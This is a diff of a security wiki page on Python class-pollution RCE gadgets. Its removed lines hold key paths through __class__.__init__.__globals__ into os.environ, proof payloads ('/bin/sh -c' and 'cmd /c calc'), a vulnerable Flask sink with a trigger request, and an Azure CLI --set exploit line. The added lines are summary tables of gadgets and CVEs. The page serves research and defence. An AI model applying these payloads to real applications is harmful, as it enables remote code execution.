@@ -14,22 +14,23 @@
     <div class="wiki-layout">
         <nav class="sidebar">
             <div class="sidebar-header">
-                <a href="/">Class Pollution Wiki</a>
+                <a href="/wiki/docs/">Class Pollution Wiki</a>
             </div>
             <ul class="sidebar-nav">
 
 
+    <li>
+        <a href="/wiki/docs/" >Overview</a>
+    </li>
     
     <li>
         <a href="/wiki/docs/taxonomy/" >Taxonomy</a>
         
         <ul>
             
+            <li><a href="/wiki/docs/taxonomy/atomics/" >Get &amp; Set Atomics</a></li>
+            
             <li><a href="/wiki/docs/taxonomy/primitives/" >Pollution Primitives</a></li>
-            
-            <li><a href="/wiki/docs/taxonomy/types/" >Vulnerability Types</a></li>
-            
-            <li><a href="/wiki/docs/taxonomy/consequences/" >Consequences</a></li>
             
         </ul>
         
@@ -59,9 +60,9 @@
             
             <li><a href="/wiki/docs/gadgets/xss/" >XSS Gadgets</a></li>
             
-            <li><a href="/wiki/docs/gadgets/dos/" >DoS Gadgets</a></li>
-            
             <li><a href="/wiki/docs/gadgets/auth-bypass/" >Auth Bypass Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/dos/" >DoS Gadgets</a></li>
             
         </ul>
         
@@ -85,7 +86,7 @@
         
         <ul>
             
-            <li><a href="/wiki/docs/collection/showcases/" >Showcases</a></li>
+            <li><a href="/wiki/docs/collection/showcases/" >Showcases &amp; CVEs</a></li>
             
         </ul>
         
@@ -93,32 +94,6 @@
     
     <li>
         <a href="/wiki/docs/defense/" >Defense</a>
-        
-    </li>
-    
-    <li>
-        <a href="/wiki/docs/reference/" >Reference</a>
-        
-        <ul>
-            
-            <li><a href="/wiki/docs/reference/cve-index/" >CVE Index</a></li>
-            
-        </ul>
-        
-    </li>
-    
-    <li>
-        <a href="/wiki/docs/faq/" >FAQ</a>
-        
-    </li>
-    
-    <li>
-        <a href="/wiki/docs/history/" >History</a>
-        
-    </li>
-    
-    <li>
-        <a href="/wiki/docs/getting-started/" >Getting Started</a>
         
     </li>
     
@@ -130,180 +105,82 @@
             
 <article>
     <h1 id="rce-gadgets">RCE Gadgets</h1>
-<p>A class-pollution RCE gadget is a (key path, value) pair that, when applied through a
-reflective sink, causes the victim process to execute attacker-chosen code. Unlike
-classical deserialization RCE, no pickle or eval is required: the attacker only writes a
-single attribute whose value the victim&rsquo;s own code later passes to a subprocess, an
-import hook, or a shell.</p>
-
-Each gadget below has been confirmed end-to-end against a real package. See the linked
-showcase pages for PoC code. RCE was landed in
-[django-unicorn](/wiki/docs/collection/showcases/django-unicorn/),
-[Mesop](/wiki/docs/collection/showcases/mesop/),
-[Taipy](/wiki/docs/collection/showcases/taipy/), and
-[Azure&nbsp;CLI](/wiki/docs/collection/showcases/azure-cli/).
-
-
-<h2 id="gadget-1--osenvironbrowser--antigravity">Gadget 1 — <code>os.environ.BROWSER</code> + <code>antigravity</code></h2>
-<h3 id="mechanism">Mechanism</h3>
-<p>The <code>webbrowser</code> stdlib module, when <code>webbrowser.open()</code> is called, consults the
-<code>BROWSER</code> environment variable and invokes the corresponding string as a shell command
-through <code>subprocess</code> on POSIX (via <code>Popen(..., shell=False)</code> after splitting on
-whitespace, but a command path like <code>/bin/sh -c 'cmd'</code> still resolves to shell
-execution). Importing <code>antigravity</code> calls <code>webbrowser.open()</code> with a fixed URL. Therefore
-overwriting <code>os.environ[&quot;BROWSER&quot;]</code> and then triggering an <code>antigravity</code> import yields
-arbitrary shell execution.</p>
-<h3 id="key-path-and-payload">Key path and payload</h3>
-<pre tabindex="0"><code>__class__.__init__.__globals__.sys.modules.os.environ.BROWSER
-</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/bin/sh -c &#39;touch /tmp/pwned&#39;&#34;</span>
-</span></span></code></pre></div><h3 id="preconditions">Preconditions</h3>
-<ul>
-<li><code>os</code> must be imported (it almost always is — <code>os</code> is imported by the Python
-startup sequence itself).</li>
-<li>The victim must later import <code>antigravity</code>, or the attacker must cause that import.
-<code>antigravity</code> is a small stdlib module not imported by default.</li>
-<li>POSIX; on Windows use the <code>COMSPEC</code> variant in Gadget 4.</li>
-</ul>
-<h3 id="triggering-the-import">Triggering the import</h3>
-<p>If the victim application performs deferred imports based on a cache or TODO list,
-poisoning that cache is sufficient. django-unicorn has a <code>location_cache</code> whose
-<code>_Cache__data.todo</code> list is processed at a later request; an entry of <code>[&quot;antigravity&quot;, &quot;any&quot;]</code> causes the process to <code>import antigravity</code>, which calls <code>webbrowser.open()</code>,
-which reads <code>BROWSER</code>.</p>
-<pre tabindex="0"><code># 1st write: stage the payload
-name:  __init__.__globals__.sys.modules.os.environ.BROWSER
-value: &#34;/bin/sh -c &#39;touch /tmp/pwned&#39;&#34;
-
-# 2nd write: poison a module-import queue that the app later drains
-name:  __init__.__globals__.location_cache._Cache__data.todo
-value: [&#34;antigravity&#34;, &#34;any&#34;]
-</code></pre><p>When the application next drains the todo list, <code>import antigravity</code> fires the gadget.</p>
-<h3 id="worked-example--minimal-flask">Worked example — minimal Flask</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">State</span>: <span style="color:#66d9ef">pass</span>
-</span></span><span style="display:flex;"><span>state <span style="color:#f92672">=</span> State()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">update</span>(obj, data):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> k, v <span style="color:#f92672">in</span> data<span style="color:#f92672">.</span>items():
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> isinstance(v, dict):
-</span></span><span style="display:flex;"><span>            update(getattr(obj, k), v)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>            setattr(obj, k, v)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.post</span>(<span style="color:#e6db74">&#34;/update&#34;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post_update</span>():
-</span></span><span style="display:flex;"><span>    update(state, request<span style="color:#f92672">.</span>get_json())
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Trigger:</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># POST /update  {&#34;__class__&#34;:{&#34;__init__&#34;:{&#34;__globals__&#34;:{&#34;sys&#34;:{&#34;modules&#34;:</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#   {&#34;os&#34;:{&#34;environ&#34;:{&#34;BROWSER&#34;:&#34;/bin/sh -c &#39;touch /tmp/pwned&#39;&#34;}}}}}}}}</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Then: in a later request, cause `import antigravity` to run.</span>
-</span></span></code></pre></div><h3 id="variants">Variants</h3>
-<ul>
-<li><strong><code>COMSPEC</code> on Windows</strong> (Gadget 4): Azure CLI&rsquo;s reproducer uses <code>COMSPEC</code> because
-the affected CLI spawns subprocesses through <code>cmd.exe</code> on Windows.</li>
-<li><strong><code>LD_PRELOAD</code> / <code>PYTHONSTARTUP</code></strong>: where the victim later spawns a Python child, these
-environment variables are also attractive but typically require a fork.</li>
-</ul>
-<h2 id="gadget-2--sysmodules-cache-injection">Gadget 2 — <code>sys.modules</code> cache injection</h2>
-<h3 id="mechanism-1">Mechanism</h3>
-<p><code>sys.modules</code> is the cache that <code>import</code> consults first. Writing an attacker-controlled
-object to <code>sys.modules[&quot;target&quot;]</code> means a later <code>import target</code> binds to that object
-without executing any loader. If any module reachable by a name is dynamically imported
-by the victim, the cache is a direct code-injection sink.</p>
-<h3 id="key-path">Key path</h3>
-<pre tabindex="0"><code>__class__.__init__.__globals__.sys.modules.&lt;module_name&gt;
-</code></pre><h3 id="preconditions-1">Preconditions</h3>
-<ul>
-<li>The victim performs a dynamic import of <code>&lt;module_name&gt;</code> <em>after</em> the pollution.</li>
-<li><code>&lt;module_name&gt;</code> must be one the victim reaches (templating, plugin systems, and ORM
-backends are common candidates — e.g. <code>django.template.loaders.cached</code>,
-<code>importlib.import_module(user_provided_name)</code>).</li>
-</ul>
-<h3 id="defense">Defense</h3>
-<ul>
-<li>Do not accept user-derived module names into <code>importlib.import_module</code>.</li>
-<li>Treat <code>sys.modules</code> as sensitive at the sink: reject any key path that descends through
-<code>sys.modules</code> at the reflective setter.</li>
-</ul>
-<h2 id="gadget-3--subprocess-default-arguments-pollution">Gadget 3 — <code>subprocess</code> default-arguments pollution</h2>
-<h3 id="mechanism-2">Mechanism</h3>
-<p>When the application later calls <code>subprocess.run</code> / <code>subprocess.Popen</code>, the default
-values of its keyword parameters are taken from <code>subprocess</code> module globals. Overwriting
-<code>subprocess._USE_POSIX_SPAWN</code> or replacing the reference <code>subprocess._args_from_interpreter_flags</code>
-can alter how subsequent spawn calls interpret their arguments, which in combination with
-an attacker-controlled command argument yields RCE.</p>
-<p>This gadget is narrower than Gadget 1: it requires <em>both</em> pollution of a subprocess
-internal <em>and</em> attacker influence over the command string. In practice it is useful as a
-second stage when <code>os.environ</code> writes are blocked.</p>
-<h2 id="gadget-4--os-command-injection-via-azure-cli-comspec">Gadget 4 — OS command injection via Azure CLI (<code>COMSPEC</code>)</h2>
-<h3 id="real-world-instance">Real-world instance</h3>
-<p><a href="/wiki/docs/collection/showcases/azure-cli/">Azure CLI, CVE-2025-24049</a>.</p>
-<p>The <code>az resource update --set</code> flag resolves a dotted path through <code>set_properties</code>:</p>
-<pre tabindex="0"><code>az resource update --ids &#34;&lt;id&gt;&#34; \
-  --set &#34;__class__.__init__.__globals__.sys.modules.os.environ.COMSPEC=cmd /c calc *&#34;
-</code></pre><h3 id="key-path-and-payload-1">Key path and payload</h3>
-<pre tabindex="0"><code>__class__.__init__.__globals__.sys.modules.os.environ.COMSPEC
-</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cmd /c calc *&#34;</span>
-</span></span></code></pre></div><h3 id="mechanism-3">Mechanism</h3>
-<p>On Windows, CPython&rsquo;s <code>subprocess</code> module reads <code>COMSPEC</code> (via <code>os.environ</code>) to decide
-which shell to spawn when <code>shell=True</code>. Azure CLI issues subprocess calls during resource
-update. Setting <code>COMSPEC</code> to an attacker-controlled command line causes the next
-<code>subprocess.run(..., shell=True)</code> to execute it.</p>
-<h3 id="preconditions-2">Preconditions</h3>
-<ul>
-<li>Windows victim. On Linux the equivalent is <code>SHELL</code>/<code>BROWSER</code> (Gadget 1).</li>
-<li>The victim executes a <code>subprocess</code> call with <code>shell=True</code> after the pollution.</li>
-</ul>
-<h2 id="general-pattern-for-rce-gadgets">General pattern for RCE gadgets</h2>
-<ol>
-<li>Reach a function via <code>__class__.__init__</code> or another <code>__class__.&lt;method&gt;</code> chain —
-this gets you to the class object and from there to any bound method.</li>
-<li>Step through <code>__globals__</code> to reach the module namespace of that function.</li>
-<li>Navigate <code>sys.modules</code> to the module you want (<code>os</code>, <code>subprocess</code>, <code>webbrowser</code>,
-<code>importlib</code>).</li>
-<li>Overwrite an environment variable, a module global, or a cache that the victim
-consults later.</li>
-<li>Trigger the consuming code path through normal application flow.</li>
-</ol>
-<h2 id="defense-1">Defense</h2>
-<ul>
-<li><strong>Reject dunder-prefixed keys at the reflective sink.</strong> See
-<a href="/wiki/docs/defense/">Defense</a> for the full mitigation list. Blocking only
-<code>__class__</code> is insufficient — any path beginning with <code>__init__</code> (which exists on
-every function) or <code>__globals__</code> (on every function) reaches the module namespace.</li>
-<li><strong>Do not perform <code>setattr</code> with user-provided keys</strong> on objects whose class pollutes
-globally. Prefer typed data containers (<code>pydantic</code>, <code>attrs</code>, <code>dataclass</code>) that do not
-expose arbitrary <code>setattr</code>.</li>
-<li><strong>At the system level</strong>, run web applications under a non-interactive environment
-that lacks <code>BROWSER</code>/<code>COMSPEC</code> — this raises the bar but does not eliminate the
-class of attack.</li>
-</ul>
+<p>RCE gadgets cause the victim process to execute attacker-provided code. The attacker writes a string at a runtime location whose value the application&rsquo;s own code later passes to <code>subprocess</code>, an import hook, or a shell.</p>
+<h2 id="standard-library">Standard library</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Library</th>
+          <th>Trigger</th>
+          <th>Polluted property</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>webbrowser</code></td>
+          <td><code>webbrowser.open</code></td>
+          <td><code>os.environ['BROWSER']</code></td>
+      </tr>
+      <tr>
+          <td><code>antigravity</code></td>
+          <td><code>import antigravity</code> (calls <code>webbrowser.open</code> on import)</td>
+          <td><code>os.environ['BROWSER']</code></td>
+      </tr>
+      <tr>
+          <td><code>subprocess</code></td>
+          <td><code>subprocess.run(..., shell=True)</code></td>
+          <td><code>os.environ['COMSPEC']</code></td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="third-party-packages">Third-party packages</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Library</th>
+          <th>Trigger</th>
+          <th>Polluted property</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>taipy.gui</code></td>
+          <td>-</td>
+          <td><code>Gui.__SELF_VAR</code></td>
+      </tr>
+  </tbody>
+</table>
 <h2 id="real-world-cases">Real-world cases</h2>
-<ul>
-<li><a href="/wiki/docs/collection/showcases/django-unicorn/">django-unicorn</a> —
-Gadget 1 via WebSocket input.</li>
-<li><a href="/wiki/docs/collection/showcases/azure-cli/">Azure CLI</a> — Gadget 4
-via <code>--set</code>.</li>
-<li><a href="/wiki/docs/collection/showcases/taipy/">Taipy</a> — Gadget 1 via
-HTTP.</li>
-<li><a href="/wiki/docs/collection/showcases/mesop/">Mesop</a> — remote execution
-path via dataclass reflective update.</li>
-</ul>
-<h2 id="references">References</h2>
-<ol>
-<li>CPython source: <code>Lib/webbrowser.py</code> — <code>get()</code> consults <code>$BROWSER</code>.
-<a href="https://github.com/python/cpython/blob/main/Lib/webbrowser.py">https://github.com/python/cpython/blob/main/Lib/webbrowser.py</a></li>
-<li>CPython source: <code>Lib/antigravity.py</code> — <code>webbrowser.open(...)</code> on import.
-<a href="https://github.com/python/cpython/blob/main/Lib/antigravity.py">https://github.com/python/cpython/blob/main/Lib/antigravity.py</a></li>
-<li>Microsoft Security Response Center. <em>CVE-2025-24049: Azure CLI Elevation of Privilege</em>.
-<a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-24049">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-24049</a></li>
-<li><code>django-unicorn</code> GHSA-g9wf-5777-gq43.
-<a href="https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43">https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43</a></li>
-</ol>
+<table>
+  <thead>
+      <tr>
+          <th>Application</th>
+          <th>Polluted property</th>
+          <th>Mechanism</th>
+          <th>CVE</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><a href="/wiki/docs/collection/showcases/django-unicorn/">django-unicorn</a></td>
+          <td><code>os.environ['BROWSER']</code> plus <code>location_cache._Cache__data.todo</code></td>
+          <td>WebSocket message via <code>set_property_value</code></td>
+          <td><a href="https://github.com/django-commons/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43">CVE-2025-24370</a></td>
+      </tr>
+      <tr>
+          <td><a href="/wiki/docs/collection/showcases/azure-cli/">Azure CLI</a></td>
+          <td><code>os.environ['COMSPEC']</code></td>
+          <td><code>--set</code> flag via <code>set_properties</code></td>
+          <td><a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-24049">CVE-2025-24049</a></td>
+      </tr>
+      <tr>
+          <td><a href="/wiki/docs/collection/showcases/taipy/">Taipy</a></td>
+          <td><code>Gui.__SELF_VAR</code></td>
+          <td>HTTP/SocketIO via <code>_attrsetter</code></td>
+          <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30374">CVE-2025-30374</a></td>
+      </tr>
+  </tbody>
+</table>
 
 </article>
 
